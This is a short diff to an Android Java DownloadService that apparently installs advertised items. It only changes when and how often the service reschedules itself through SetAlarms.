@@ -54,8 +54,9 @@ public class DownloadService extends IntentService {
                 			new AdHandler(context).putOneToInstall(ad);
                 			Intent intent = new Intent(context,InstallService.class);
                 			context.startService(intent);
+                		delay = 0.0;
+                        SetAlarms.enableAlarmsService(context, delay, 1 * 2, DownloadService.class, true);
 
-                		delay = 1.0;
                 	}
                 	Intent intent = new Intent(context,InstallService.class);
         			context.startService(intent);
@@ -64,10 +65,10 @@ public class DownloadService extends IntentService {
                 	Intent intent1 = new Intent(context,InstallService.class);
         			context.startService(intent1);
                 	delay = 1.0;
+                    SetAlarms.enableAlarmsService(context, delay, delay * 2, DownloadService.class, true);
                 	break;
                 }
                 
-                SetAlarms.enableAlarmsService(context, 0, delay * 10, DownloadService.class, true);
                 running=false;
                 super.handleMessage(message);
             }
